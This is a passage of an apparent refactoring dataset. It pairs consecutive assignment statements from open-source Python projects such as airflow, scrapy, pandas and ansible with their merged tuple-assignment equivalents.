compressors = [None, Zlib(level=1), BZ2(level=1), Blosc(cname='zstd', clevel=1, shuffle=0), Blosc(cname='zstd', clevel=1, shuffle=1), Blosc(cname='zstd', clevel=1, shuffle=2), Blosc(cname='lz4', clevel=1, shuffle=0)]","arrays_chunks , compressors  = [(np.arange(1111, dtype='<i1'), 100), (np.arange(1111, dtype='<i2'), 100), (np.arange(1111, dtype='<i4'), 100), (np.arange(1111, dtype='<i8'), 1000), (np.random.randint(0, 200, size=2222, dtype='u1').astype('<u1'), 100), (np.random.randint(0, 2000, size=2222, dtype='u2').astype('<u2'), 100), (np.random.randint(0, 2000, size=2222, dtype='u4').astype('<u4'), 100), (np.random.randint(0, 2000, size=2222, dtype='u8').astype('<u8'), 100), (np.linspace(0, 1, 3333, dtype='<f2'), 100), (np.linspace(0, 1, 3333, dtype='<f4'), 100), (np.linspace(0, 1, 3333, dtype='<f8'), 100), (np.random.normal(loc=0, scale=1, size=4444).astype('<f2'), 100), (np.random.normal(loc=0, scale=1, size=4444).astype('<f4'), 100), (np.random.normal(loc=0, scale=1, size=4444).astype('<f8'), 100), (np.random.choice([b'A', b'C', b'G', b'T'], size=5555, replace=True).astype('S'), 100), (np.random.choice(['foo', 'bar', 'baz', 'quux'], size=5555, replace=True).astype('<U'), 100), (np.random.choice([0, 1 / 3, 1 / 7, 1 / 9, np.nan], size=5555, replace=True).astype('<f8'), 100), (np.random.randint(0, 2, size=5555, dtype=bool), 100), (np.arange(20000, dtype='<i4').reshape(2000, 10, order='C'), (100, 3)), (np.arange(20000, dtype='<i4').reshape(200, 100, order='F'), (100, 30)), (np.arange(20000, dtype='<i4').reshape(200, 10, 10, order='C'), (100, 3, 3)), (np.arange(20000, dtype='<i4').reshape(20, 100, 10, order='F'), (10, 30, 3)), (np.arange(20000, dtype='<i4').reshape(20, 10, 10, 10, order='C'), (10, 3, 3, 3)), (np.arange(20000, dtype='<i4').reshape(20, 10, 10, 10, order='F'), (10, 3, 3, 3))], [None, Zlib(level=1), BZ2(level=1), Blosc(cname='zstd', clevel=1, shuffle=0), Blosc(cname='zstd', clevel=1, shuffle=1), Blosc(cname='zstd', clevel=1, shuffle=2), Blosc(cname='lz4', clevel=1, shuffle=0)]"
alexa-skills-kit-sdk-for-python,https://github.com/alexa/alexa-skills-kit-sdk-for-python/tree/master/ask-sdk-webservice-support/ask_sdk_webservice_support/webservice_handler.py,WebserviceSkillHandler,__init__$48,"def __init__(
            self, skill, verify_signature=True,
            verify_timestamp=True, verifiers=None):
        # type: (CustomSkill, bool, bool, List[AbstractVerifier]) -> None
        """"""Skill Handler for skill as webservice.

        This class can be used by skill developers when they want their
        skills to be deployed as a web service, rather than using AWS
        Lambda.

        The class constructor takes in a custom skill instance that is
        used for routing the input request. The boolean verify_signature
        variable configures if the request signature is verified for each
        input request. The boolean verify_timestamp configures if the
        request timestamp is verified for each input request. Additionally,
        an optional list of verifiers can also be provided, to be applied
        on the input request.

        :param skill: Custom skill instance containing registered
            request handlers and other components. If skill builders
            are being used to register the components, then the `create`
            method can be used to get this instance
        :type skill: ask_sdk_core.skill.CustomSkill
        :param verify_signature: Enable request signature verification
        :type verify_signature: bool
        :param verify_timestamp: Enable request timestamp verification
        :type verify_timestamp: bool
        :param verifiers: Optional list of verifiers that needs to be
            applied to the input request
        :type verifiers: list[
            ask_sdk_webservice_support.verifiers.AbstractVerifier]
        """"""
        self._skill = skill
        self._verifiers = []  # type: List[AbstractVerifier]

        if not isinstance(skill, CustomSkill):
            raise TypeError(
                ""Invalid skill instance provided. Expected a custom ""
                ""skill instance."")

        self._add_custom_user_agent(""ask-webservice"")

        if verify_signature:
            self._verifiers.append(RequestVerifier())

        if verify_timestamp:
            self._verifiers.append(TimestampVerifier())

        if verifiers is not None:
            self._verifiers.extend(verifiers)","self._skill = skill
self._verifiers = []","self._skill , self._verifiers  = skill, []"
scrapy,https://github.com/scrapy/scrapy/tree/master/tests/test_dupefilters.py,RFPDupeFilterTest,test_filter$66,"def test_filter(self):
        dupefilter = RFPDupeFilter()
        dupefilter.open()

        r1 = Request('http://scrapytest.org/1')
        r2 = Request('http://scrapytest.org/2')
        r3 = Request('http://scrapytest.org/2')

        assert not dupefilter.request_seen(r1)
        assert dupefilter.request_seen(r1)

        assert not dupefilter.request_seen(r2)
        assert dupefilter.request_seen(r3)

        dupefilter.close('finished')","r1 = Request('http://scrapytest.org/1')
r2 = Request('http://scrapytest.org/2')
r3 = Request('http://scrapytest.org/2')","r1 , r2 , r3  = Request('http://scrapytest.org/1'), Request('http://scrapytest.org/2'), Request('http://scrapytest.org/2')"
deocclusion,https://github.com/XiaohangZhan/deocclusion/tree/master/demos/GCAMatting/dataloader/data_generator.py,RandomAffine,__init__$74,"def __init__(self, degrees, translate=None, scale=None, shear=None, flip=None, resample=False, fillcolor=0):
        if isinstance(degrees, numbers.Number):
            if degrees < 0:
                raise ValueError(""If degrees is a single number, it must be positive."")
            self.degrees = (-degrees, degrees)
        else:
            assert isinstance(degrees, (tuple, list)) and len(degrees) == 2, \
                ""degrees should be a list or tuple and it must be of length 2.""
            self.degrees = degrees

        if translate is not None:
            assert isinstance(translate, (tuple, list)) and len(translate) == 2, \
                ""translate should be a list or tuple and it must be of length 2.""
            for t in translate:
                if not (0.0 <= t <= 1.0):
                    raise ValueError(""translation values should be between 0 and 1"")
        self.translate = translate

        if scale is not None:
            assert isinstance(scale, (tuple, list)) and len(scale) == 2, \
                ""scale should be a list or tuple and it must be of length 2.""
            for s in scale:
                if s <= 0:
                    raise ValueError(""scale values should be positive"")
        self.scale = scale

        if shear is not None:
            if isinstance(shear, numbers.Number):
                if shear < 0:
                    raise ValueError(""If shear is a single number, it must be positive."")
                self.shear = (-shear, shear)
            else:
                assert isinstance(shear, (tuple, list)) and len(shear) == 2, \
                    ""shear should be a list or tuple and it must be of length 2.""
                self.shear = shear
        else:
            self.shear = shear

        self.resample = resample
        self.fillcolor = fillcolor
        self.flip = flip","self.resample = resample
self.fillcolor = fillcolor
self.flip = flip","self.resample , self.fillcolor , self.flip  = resample, fillcolor, flip"
kornia,https://github.com/kornia/kornia/tree/master/kornia/filters/blur_pool.py,BlurPool2D,__init__$44,"def __init__(self, kernel_size: int, stride: int = 2):
        super().__init__()
        self.kernel_size = kernel_size
        self.stride = stride
        self.register_buffer('kernel', get_pascal_kernel_2d(kernel_size, norm=True))","self.kernel_size = kernel_size
self.stride = stride","self.kernel_size , self.stride  = kernel_size, stride"
PyBitmessage,https://github.com/Bitmessage/PyBitmessage/tree/master/src/network/objectracker.py,ObjectTracker,__init__$40,"def __init__(self):
        self.objectsNewToMe = RandomTrackingDict()
        self.objectsNewToThem = {}
        self.objectsNewToThemLock = RLock()
        self.initInvBloom()
        self.initAddrBloom()
        self.lastCleaned = time.time()","self.objectsNewToMe = RandomTrackingDict()
self.objectsNewToThem = {}
self.objectsNewToThemLock = RLock()","self.objectsNewToMe , self.objectsNewToThem , self.objectsNewToThemLock  = RandomTrackingDict(), {}, RLock()"
PaddleSlim,https://github.com/PaddlePaddle/PaddleSlim/tree/master/paddleslim/dygraph/prune/pruning_plan.py,PruningPlan,_restore_opt$137,"def _restore_opt(self, param_name, sub_layer, opt):
        if opt is None:
            return
        for k, v in opt._accumulators.items():
            var_tmp = v.get(param_name)
            if var_tmp is None: continue
            backup_name = var_tmp.name.replace(""."", ""_"") + ""_backup""
            if backup_name in sub_layer._buffers:
                _logger.debug(""Restore values of variable: {}"".format(
                    var_tmp.name))
                t_value = var_tmp.value().get_tensor()
                t_backup = sub_layer._buffers[backup_name].value().get_tensor()

                p = t_value._place()
                if p.is_cpu_place():
                    place = paddle.CPUPlace()
                elif p.is_cuda_pinned_place():
                    place = paddle.CUDAPinnedPlace()
                else:
                    p = paddle.framework.core.Place()
                    p.set_place(t_value._place())
                    place = paddle.CUDAPlace(p.gpu_device_id())

                t_value.set(np.array(t_backup).astype(""float32""), place)
                del sub_layer._buffers[backup_name]","t_backup = sub_layer._buffers[backup_name].value().get_tensor()
p = t_value._place()","t_backup , p  = sub_layer._buffers[backup_name].value().get_tensor(), t_value._place()"
devpi,https://github.com/devpi/devpi/tree/master/server/test_devpi_server/test_view_auth.py,TestCredentialPlugins,test_credential_plugins_no_credentials$61,"def test_credential_plugins_no_credentials(self, blank_request, dsp, plugin1, plugin2):
        plugin1.results = [None]
        plugin2.results = [None]
        request = blank_request()
        assert dsp._get_credentials(request) is None","plugin1.results = [None]
plugin2.results = [None]
request = blank_request()","plugin1.results , plugin2.results , request  = [None], [None], blank_request()"
airflow,https://github.com/apache/airflow/tree/master/tests/jobs/test_backfill_job.py,TestBackfillJob,test_backfill_conf$274,"def test_backfill_conf(self, dag_maker):
        dag = self._get_dummy_dag(dag_maker, dag_id='test_backfill_conf')
        dag_maker.create_dagrun()

        executor = MockExecutor()

        conf_ = json.loads(""""""{""key"": ""value""}"""""")
        job = BackfillJob(
            dag=dag,
            executor=executor,
            start_date=DEFAULT_DATE,
            end_date=DEFAULT_DATE + datetime.timedelta(days=2),
            conf=conf_,
        )
        job.run()

        # We ignore the first dag_run created by fixture
        dr = DagRun.find(
            dag_id='test_backfill_conf', execution_start_date=DEFAULT_DATE + datetime.timedelta(days=1)
        )

        assert conf_ == dr[0].conf","executor = MockExecutor()
conf_ = json.loads('{""key"": ""value""}')","executor , conf_  = MockExecutor(), json.loads('{""key"": ""value""}')"
Awesome-GANs,https://github.com/kozistr/Awesome-GANs/tree/master/awesome_gans/sgan/sgan_model.py,SGAN,discriminator_0$195,"def discriminator_0(self, x, reuse=None):
        """"""
        :param x: MNIST image, (-1, 784)
        :param reuse: re-usability
        :return: z prob, disc prob
        """"""
        with tf.variable_scope('discriminator_0', reuse=reuse):
            x = tf.reshape(x, [-1] + self.image_shape)  # (-1, 28, 28, 1)
            x = gaussian_noise(x)

            x = conv2d(x, self.df_dim * 1, name='d_0-conv2d-1')
            x = tf.nn.leaky_relu(x)

            x = conv2d(x, self.df_dim * 2, name='d_0-conv2d-2')
            x = batch_norm(x)
            x = tf.nn.leaky_relu(x)

            x = conv2d(x, self.df_dim * 4, name='d_0-conv2d-3')
            x = batch_norm(x)
            x = tf.nn.leaky_relu(x)

            x = tf.layers.flatten(x)

            x = tf.layers.dense(x, self.fc_unit, name='d_0-fc-1')

            z = tf.layers.dense(x, self.z_dim, activation=tf.nn.sigmoid, name='d_0-fc-2')
            logits = tf.layers.dense(x, self.input_channel, name='d_0-fc-3')

            return z, logits","z = tf.layers.dense(x, self.z_dim, activation=tf.nn.sigmoid, name='d_0-fc-2')
logits = tf.layers.dense(x, self.input_channel, name='d_0-fc-3')","z , logits  = tf.layers.dense(x, self.z_dim, activation=tf.nn.sigmoid, name='d_0-fc-2'), tf.layers.dense(x, self.input_channel, name='d_0-fc-3')"
hachoir,https://github.com/vstinner/hachoir/tree/master/hachoir/core/log.py,Log,__init__$18,"def __init__(self):
        self.__buffer = {}
        self.__file = None
        self.use_print = True
        self.use_buffer = False
        # Prototype: def func(level, prefix, text, context)
        self.on_new_message = None","self.__buffer = {}
self.__file = None
self.use_print = True
self.use_buffer = False
self.on_new_message = None","self.__buffer , self.__file , self.use_print , self.use_buffer , self.on_new_message  = {}, None, True, False, None"
DSView,https://github.com/DreamSourceLab/DSView/tree/master/libsigrokdecode4DSL/decoders/lpc/pd.py,Decoder,handle_get_fw_msize$278,"def handle_get_fw_msize(self):
        # LAD[3:0]: MSIZE field (1 clock cycle).
        self.es_block = self.samplenum
        s = 'MSIZE: 0x%%0%dx' % self.oldlad
        self.putb([3, [s % self.oldlad]])
        self.ss_block = self.samplenum
        self.msize = self.oldlad

        if self.direction == 1:
            self.state = 'GET FW DATA'
            self.cycle_count = 0
            self.dataword = 0
            self.cur_nibble = 0
        else:
            self.state = 'GET TAR'
            self.tar_count = 0","self.ss_block = self.samplenum
self.msize = self.oldlad","self.ss_block , self.msize  = self.samplenum, self.oldlad"
DSView,https://github.com/DreamSourceLab/DSView/tree/master/libsigrokdecode4DSL/decoders/lpc/pd.py,Decoder,handle_get_fw_msize$278,"def handle_get_fw_msize(self):
        # LAD[3:0]: MSIZE field (1 clock cycle).
        self.es_block = self.samplenum
        s = 'MSIZE: 0x%%0%dx' % self.oldlad
        self.putb([3, [s % self.oldlad]])
        self.ss_block = self.samplenum
        self.msize = self.oldlad

        if self.direction == 1:
            self.state = 'GET FW DATA'
            self.cycle_count = 0
            self.dataword = 0
            self.cur_nibble = 0
        else:
            self.state = 'GET TAR'
            self.tar_count = 0","self.state = 'GET FW DATA'
self.cycle_count = 0
self.dataword = 0
self.cur_nibble = 0","self.state , self.cycle_count , self.dataword , self.cur_nibble  = 'GET FW DATA', 0, 0, 0"
PaddleViT,https://github.com/BR-IDL/PaddleViT/tree/master/object_detection/PVTv2/coco.py,,make_coco_transforms$202,"def make_coco_transforms(image_set):
    """""" return transforms(class defined in ./transforms.py) for coco train and val""""""
    normalize = T.Compose([
        T.ToTensor(),
        T.Normalize([0.485, 0.456, 0.406], [0.229, 0.224, 0.225])
    ])

    scales = [480, 512, 544, 576, 608, 640, 672, 704, 736, 768, 800]

    if image_set == 'train':
        return T.Compose([
            T.RandomHorizontalFlip(),
            T.RandomSelect(
                T.RandomResize(scales, max_size=1333),
                T.Compose([
                    T.RandomResize([400, 500, 600]),
                    T.RandomSizeCrop(384, 600),
                    T.RandomResize(scales, max_size=1333),
                ])
         ),
            normalize,
        ])

    if image_set == 'val':
        return T.Compose([
            T.RandomResize([800], max_size=1333),
            #T.Pad(size_divisor=32),
            normalize,
        ])

    raise ValueError(f'Unknown {image_set}')","normalize = T.Compose([T.ToTensor(), T.Normalize([0.485, 0.456, 0.406], [0.229, 0.224, 0.225])])
scales = [480, 512, 544, 576, 608, 640, 672, 704, 736, 768, 800]","normalize , scales  = T.Compose([T.ToTensor(), T.Normalize([0.485, 0.456, 0.406], [0.229, 0.224, 0.225])]), [480, 512, 544, 576, 608, 640, 672, 704, 736, 768, 800]"
swift,https://github.com/openstack/swift/tree/master/test/unit/common/ring/test_composite_builder.py,BaseTestCompositeBuilder,save_builders$78,"def save_builders(self, builders, missing_ids=None, prefix='builder'):
        missing_ids = missing_ids or []
        builder_files = []
        for i, builder in enumerate(builders):
            fname = os.path.join(self.tmpdir, '%s_%s.builder' % (prefix, i))
            if i in missing_ids:
                self.save_builder_with_no_id(builder, fname)
            else:
                builder.save(fname)
            builder_files.append(fname)
        return builder_files","missing_ids = missing_ids or []
builder_files = []","missing_ids , builder_files  = missing_ids or [], []"
pandas,https://github.com/pandas-dev/pandas/tree/master/pandas/tests/extension/base/ops.py,BaseOpsUtil,_check_op$30,"def _check_op(
        self, ser: pd.Series, op, other, op_name: str, exc=NotImplementedError
    ):
        if exc is None:
            result = op(ser, other)
            expected = self._combine(ser, other, op)
            assert isinstance(result, type(ser))
            self.assert_equal(result, expected)
        else:
            with pytest.raises(exc):
                op(ser, other)","result = op(ser, other)
expected = self._combine(ser, other, op)","result , expected  = op(ser, other), self._combine(ser, other, op)"
baserow,https://github.com/bram2w/baserow/tree/master/backend/src/baserow/contrib/database/formula/parser/update_field_names.py,UpdateFieldNameFormulaVisitor,visitFieldReference$78,"def visitFieldReference(self, ctx: BaserowFormula.FieldReferenceContext):
        reference = ctx.field_reference()
        is_single_quote_ref = reference.SINGLEQ_STRING_LITERAL()
        field_name = convert_string_literal_token_to_string(
            reference.getText(), is_single_quote_ref
        )
        if self.via_field is not None:
            # Don't do any field reference renaming as this is a field being re-named
            # in another table
            return ctx.getText()
        elif field_name in self.field_names_to_update:
            escaped_new_name = self._rename_and_escape(field_name, is_single_quote_ref)
            field = ctx.FIELD().getText()
            return f""{field}({escaped_new_name})""
        elif field_name in self.field_names_to_replace_with_id_refs:
            return (
                f""field_by_id({self.field_names_to_replace_with_id_refs[field_name]})""
            )
        else:
            return ctx.getText()","escaped_new_name = self._rename_and_escape(field_name, is_single_quote_ref)
field = ctx.FIELD().getText()","escaped_new_name , field  = self._rename_and_escape(field_name, is_single_quote_ref), ctx.FIELD().getText()"
conan,https://github.com/conan-io/conan/tree/master/conans/test/integration/conan_api/two_conan_creates_test.py,ConanCreateTest,test_preprocessor_called_second_api_call$21,"def test_preprocessor_called_second_api_call(self):
        """"""""When calling twice to conan create with the Conan python API, the default
        settings shouldn't be cached. To test that the default profile is not cached,
        this test is verifying that the setting preprocessor is adjusting the runtime
        to MDd when build_type=Debug after a different call to conan create that could
        cache the runtime to MD (issue reported at: #4246) """"""
        tmp = temp_folder()
        with environment_append({""CONAN_USER_HOME"": tmp}):
            with chdir(tmp):
                api = ConanAPIV1(output=TestBufferConanOutput())
                api.new(name=""lib/1.0@conan/stable"", bare=True)

                def get_conaninfo(info):
                    package_id = info[""installed""][0][""packages""][0][""id""]
                    pref = PackageReference.loads(""lib/1.0@conan/stable:%s"" % package_id)
                    cache = ClientCache(api.cache_folder, TestBufferConanOutput())
                    folder = cache.package_layout(pref.ref).package(pref)
                    return load(os.path.join(folder, ""conaninfo.txt""))

                settings = [""compiler=Visual Studio"", ""compiler.version=15"", ""build_type=Release""]
                info = api.create(""."", name=None, version=None, user=""conan"", channel=""stable"",
                                  settings=settings)
                self.assertIn(""compiler.runtime=MD"", get_conaninfo(info))

                settings = [""compiler=Visual Studio"", ""compiler.version=15"", ""build_type=Debug""]
                info = api.create(""."", name=None, version=None, user=""conan"", channel=""stable"",
                                  settings=settings)
                self.assertIn(""compiler.runtime=MDd"", get_conaninfo(info))","pref = PackageReference.loads('lib/1.0@conan/stable:%s' % package_id)
cache = ClientCache(api.cache_folder, TestBufferConanOutput())","pref , cache  = PackageReference.loads('lib/1.0@conan/stable:%s' % package_id), ClientCache(api.cache_folder, TestBufferConanOutput())"
speakeasy,https://github.com/mandiant/speakeasy/tree/master/examples/dbgview.py,DbgView,debug_printex_hook$23,"def debug_printex_hook(self, emu, api_name, func, params):
        # Call the DbgPrintEx function and print the formatted string to the console
        rv = func(params)

        formatted_str = params[2]
        print(formatted_str)

        return rv","rv = func(params)
formatted_str = params[2]","rv , formatted_str  = func(params), params[2]"
ansible-modules-extras,https://github.com/ansible/ansible-modules-extras/tree/master/network/f5/bigip_selfip.py,BigIpSelfIp,update$416,"def update(self):
        changed = False
        svcs = []
        params = dict()
        current = self.read()

        check_mode = self.params['check_mode']
        address = self.params['address']
        allow_service = self.params['allow_service']
        name = self.params['name']
        netmask = self.params['netmask']
        partition = self.params['partition']
        traffic_group = self.params['traffic_group']
        vlan = self.params['vlan']
        route_domain = self.params['route_domain']

        if address is not None and address != current['address']:
            raise F5ModuleError(
                'Self IP addresses cannot be updated'
            )

        if netmask is not None:
            # I ignore the address value here even if they provide it because
            # you are not allowed to change it.
            try:
                address = IPNetwork(current['address'])

                new_addr = ""%s/%s"" % (address.ip, netmask)
                nipnet = IPNetwork(new_addr)
                if route_domain is not None:
                    nipnet = ""%s%s%s"" % (address.ip, route_domain, netmask)

                cur_addr = ""%s/%s"" % (current['address'], current['netmask'])
                cipnet = IPNetwork(cur_addr)
                if route_domain is not None:
                    cipnet = ""%s%s%s"" % (current['address'], current['route_domain'], current['netmask'])

                if nipnet != cipnet:
                    if route_domain is not None:
                        address = ""%s%s%s/%s"" % (address.ip, '%', route_domain, netmask)
                    else:
                        address = ""%s/%s"" % (nipnet.ip, nipnet.prefixlen)
                    params['address'] = address
            except AddrFormatError:
                raise F5ModuleError(
                    'The provided address/netmask value was invalid'
                )

        if traffic_group is not None:
            traffic_group = ""/%s/%s"" % (partition, traffic_group)
            if traffic_group not in self.traffic_groups():
                raise F5ModuleError(
                    'The specified traffic group was not found'
                )

            if 'traffic_group' in current:
                if traffic_group != current['traffic_group']:
                    params['trafficGroup'] = traffic_group
            else:
                params['trafficGroup'] = traffic_group

        if vlan is not None:
            vlans = self.get_vlans()
            vlan = ""/%s/%s"" % (partition, vlan)

            if 'vlan' in current:
                if vlan != current['vlan']:
                    params['vlan'] = vlan
            else:
                params['vlan'] = vlan

            if vlan not in vlans:
                raise F5ModuleError(
                    'The specified VLAN was not found'
                )

        if allow_service is not None:
            svcs = self.verify_services()
            if 'allow_service' in current:
                if svcs != current['allow_service']:
                    params['allowService'] = self.fmt_services(svcs)
            else:
                params['allowService'] = self.fmt_services(svcs)

        if params:
            changed = True
            params['name'] = name
            params['partition'] = partition
            if check_mode:
                return changed
            self.cparams = camel_dict_to_snake_dict(params)
            if svcs:
                self.cparams['allow_service'] = list(svcs)
        else:
            return changed

        r = self.api.tm.net.selfips.selfip.load(
            name=name,
            partition=partition
        )
        r.update(**params)
        r.refresh()

        return True","changed = False
svcs = []
params = dict()
current = self.read()
check_mode = self.params['check_mode']
address = self.params['address']
allow_service = self.params['allow_service']
name = self.params['name']
netmask = self.params['netmask']
partition = self.params['partition']
traffic_group = self.params['traffic_group']
vlan = self.params['vlan']
route_domain = self.params['route_domain']","changed , svcs , params , current , check_mode , address , allow_service , name , netmask , partition , traffic_group , vlan , route_domain  = False, [], dict(), self.read(), self.params['check_mode'], self.params['address'], self.params['allow_service'], self.params['name'], self.params['netmask'], self.params['partition'], self.params['traffic_group'], self.params['vlan'], self.params['route_domain']"
ansible-modules-extras,https://github.com/ansible/ansible-modules-extras/tree/master/network/f5/bigip_selfip.py,BigIpSelfIp,update$416,"def update(self):
        changed = False
        svcs = []
        params = dict()
        current = self.read()

        check_mode = self.params['check_mode']
        address = self.params['address']
        allow_service = self.params['allow_service']
        name = self.params['name']
        netmask = self.params['netmask']
        partition = self.params['partition']
        traffic_group = self.params['traffic_group']
        vlan = self.params['vlan']
        route_domain = self.params['route_domain']

        if address is not None and address != current['address']:
            raise F5ModuleError(
                'Self IP addresses cannot be updated'
            )

        if netmask is not None:
            # I ignore the address value here even if they provide it because
            # you are not allowed to change it.
            try:
                address = IPNetwork(current['address'])

                new_addr = ""%s/%s"" % (address.ip, netmask)
                nipnet = IPNetwork(new_addr)
                if route_domain is not None:
                    nipnet = ""%s%s%s"" % (address.ip, route_domain, netmask)

                cur_addr = ""%s/%s"" % (current['address'], current['netmask'])
                cipnet = IPNetwork(cur_addr)
                if route_domain is not None:
                    cipnet = ""%s%s%s"" % (current['address'], current['route_domain'], current['netmask'])

                if nipnet != cipnet:
                    if route_domain is not None:
                        address = ""%s%s%s/%s"" % (address.ip, '%', route_domain, netmask)
                    else:
                        address = ""%s/%s"" % (nipnet.ip, nipnet.prefixlen)
                    params['address'] = address
            except AddrFormatError:
                raise F5ModuleError(
                    'The provided address/netmask value was invalid'
                )

        if traffic_group is not None:
            traffic_group = ""/%s/%s"" % (partition, traffic_group)
            if traffic_group not in self.traffic_groups():
                raise F5ModuleError(
                    'The specified traffic group was not found'
                )

            if 'traffic_group' in current:
                if traffic_group != current['traffic_group']:
                    params['trafficGroup'] = traffic_group
            else:
                params['trafficGroup'] = traffic_group

        if vlan is not None:
            vlans = self.get_vlans()
            vlan = ""/%s/%s"" % (partition, vlan)

            if 'vlan' in current:
                if vlan != current['vlan']:
                    params['vlan'] = vlan
            else:
                params['vlan'] = vlan

            if vlan not in vlans:
                raise F5ModuleError(
                    'The specified VLAN was not found'
                )

        if allow_service is not None:
            svcs = self.verify_services()
            if 'allow_service' in current:
                if svcs != current['allow_service']:
                    params['allowService'] = self.fmt_services(svcs)
            else:
                params['allowService'] = self.fmt_services(svcs)

        if params:
            changed = True
            params['name'] = name
            params['partition'] = partition
            if check_mode:
                return changed
            self.cparams = camel_dict_to_snake_dict(params)
            if svcs:
                self.cparams['allow_service'] = list(svcs)
        else:
            return changed

        r = self.api.tm.net.selfips.selfip.load(
            name=name,
            partition=partition
        )
        r.update(**params)
        r.refresh()

        return True","vlans = self.get_vlans()
vlan = '/%s/%s' % (partition, vlan)","vlans , vlan  = self.get_vlans(), '/%s/%s' % (partition, vlan)"
ansible-modules-extras,https://github.com/ansible/ansible-modules-extras/tree/master/network/f5/bigip_selfip.py,BigIpSelfIp,update$416,"def update(self):
        changed = False
        svcs = []
        params = dict()
        current = self.read()

        check_mode = self.params['check_mode']
        address = self.params['address']
        allow_service = self.params['allow_service']
        name = self.params['name']
        netmask = self.params['netmask']
        partition = self.params['partition']
        traffic_group = self.params['traffic_group']
        vlan = self.params['vlan']
        route_domain = self.params['route_domain']

        if address is not None and address != current['address']:
            raise F5ModuleError(
                'Self IP addresses cannot be updated'
            )

        if netmask is not None:
            # I ignore the address value here even if they provide it because
            # you are not allowed to change it.
            try:
                address = IPNetwork(current['address'])

                new_addr = ""%s/%s"" % (address.ip, netmask)
                nipnet = IPNetwork(new_addr)
                if route_domain is not None:
                    nipnet = ""%s%s%s"" % (address.ip, route_domain, netmask)

                cur_addr = ""%s/%s"" % (current['address'], current['netmask'])
                cipnet = IPNetwork(cur_addr)
                if route_domain is not None:
                    cipnet = ""%s%s%s"" % (current['address'], current['route_domain'], current['netmask'])

                if nipnet != cipnet:
                    if route_domain is not None:
                        address = ""%s%s%s/%s"" % (address.ip, '%', route_domain, netmask)
                    else:
                        address = ""%s/%s"" % (nipnet.ip, nipnet.prefixlen)
                    params['address'] = address
            except AddrFormatError:
                raise F5ModuleError(
                    'The provided address/netmask value was invalid'
                )

        if traffic_group is not None:
            traffic_group = ""/%s/%s"" % (partition, traffic_group)
            if traffic_group not in self.traffic_groups():
                raise F5ModuleError(
                    'The specified traffic group was not found'
                )

            if 'traffic_group' in current:
                if traffic_group != current['traffic_group']:
                    params['trafficGroup'] = traffic_group
            else:
                params['trafficGroup'] = traffic_group

        if vlan is not None:
            vlans = self.get_vlans()
            vlan = ""/%s/%s"" % (partition, vlan)

            if 'vlan' in current:
                if vlan != current['vlan']:
                    params['vlan'] = vlan
            else:
                params['vlan'] = vlan

            if vlan not in vlans:
                raise F5ModuleError(
                    'The specified VLAN was not found'
                )

        if allow_service is not None:
            svcs = self.verify_services()
            if 'allow_service' in current:
                if svcs != current['allow_service']:
                    params['allowService'] = self.fmt_services(svcs)
            else:
                params['allowService'] = self.fmt_services(svcs)

        if params:
            changed = True
            params['name'] = name
            params['partition'] = partition
            if check_mode:
                return changed
            self.cparams = camel_dict_to_snake_dict(params)
            if svcs:
                self.cparams['allow_service'] = list(svcs)
        else:
            return changed

        r = self.api.tm.net.selfips.selfip.load(
            name=name,
            partition=partition
        )
        r.update(**params)
        r.refresh()

        return True","changed = True
params['name'] = name
params['partition'] = partition","changed , params['name'] , params['partition']  = True, name, partition"
pyradio,https://github.com/coderholic/pyradio/tree/master/pyradio/config_window.py,PyRadioConfigWindow,_load_default_values$295,"def _load_default_values(self):
        self._config_options['general_title'][1] = ''
        self._config_options['player'][1] = 'mpv,mplayer,vlc'
        self._config_options['open_last_playlist'][1] = 'False'
        self._config_options['default_playlist'][1] = 'stations'
        self._config_options['default_station'][1] = 'False'
        self._config_options['default_encoding'][1] = 'utf-8'
        self._config_options['enable_mouse'][1] = 'False'
        self._config_options['connection_timeout'][1] = '10'
        self._config_options['theme_title'][1] = ''
        ''' Transparency '''
        #self._old_use_transparency = self._config_options['use_transparency'][1]
        self._config_options['use_transparency'][1] = False
        self._config_options['force_http'][1] = False
        self._toggle_transparency_function(changed_from_config_window=True, force_value=False)
        self._config_options['playlist_manngement_title'][1] = ''
        self._config_options['confirm_station_deletion'][1] = True
        self._config_options['confirm_playlist_reload'][1] = True
        self._config_options['auto_save_playlist'][1] = False
        self._config_options['requested_player'][1] = ''
        ''' Theme
            Put this AFTER applying transparency, so that _do_init_pairs in
            _toggle_transparency does not overwrite pairs with applied theme values
        '''
        self._config_options['theme'][1] = 'dark'
        self._apply_a_theme('dark', False)
        self._check_if_config_is_dirty()","self._config_options['general_title'][1] = ''
self._config_options['player'][1] = 'mpv,mplayer,vlc'
self._config_options['open_last_playlist'][1] = 'False'
self._config_options['default_playlist'][1] = 'stations'
self._config_options['default_station'][1] = 'False'
self._config_options['default_encoding'][1] = 'utf-8'
self._config_options['enable_mouse'][1] = 'False'
self._config_options['connection_timeout'][1] = '10'
self._config_options['theme_title'][1] = ''","self._config_options['general_title'][1] , self._config_options['player'][1] , self._config_options['open_last_playlist'][1] , self._config_options['default_playlist'][1] , self._config_options['default_station'][1] , self._config_options['default_encoding'][1] , self._config_options['enable_mouse'][1] , self._config_options['connection_timeout'][1] , self._config_options['theme_title'][1]  = '', 'mpv,mplayer,vlc', 'False', 'stations', 'False', 'utf-8', 'False', '10', ''"
pyradio,https://github.com/coderholic/pyradio/tree/master/pyradio/config_window.py,PyRadioConfigWindow,_load_default_values$295,"def _load_default_values(self):
        self._config_options['general_title'][1] = ''
        self._config_options['player'][1] = 'mpv,mplayer,vlc'
        self._config_options['open_last_playlist'][1] = 'False'
        self._config_options['default_playlist'][1] = 'stations'
        self._config_options['default_station'][1] = 'False'
        self._config_options['default_encoding'][1] = 'utf-8'
        self._config_options['enable_mouse'][1] = 'False'
        self._config_options['connection_timeout'][1] = '10'
        self._config_options['theme_title'][1] = ''
        ''' Transparency '''
        #self._old_use_transparency = self._config_options['use_transparency'][1]
        self._config_options['use_transparency'][1] = False
        self._config_options['force_http'][1] = False
        self._toggle_transparency_function(changed_from_config_window=True, force_value=False)
        self._config_options['playlist_manngement_title'][1] = ''
        self._config_options['confirm_station_deletion'][1] = True
        self._config_options['confirm_playlist_reload'][1] = True
        self._config_options['auto_save_playlist'][1] = False
        self._config_options['requested_player'][1] = ''
        ''' Theme
            Put this AFTER applying transparency, so that _do_init_pairs in
            _toggle_transparency does not overwrite pairs with applied theme values
        '''
        self._config_options['theme'][1] = 'dark'
        self._apply_a_theme('dark', False)
        self._check_if_config_is_dirty()","self._config_options['use_transparency'][1] = False
self._config_options['force_http'][1] = False","self._config_options['use_transparency'][1] , self._config_options['force_http'][1]  = False, False"
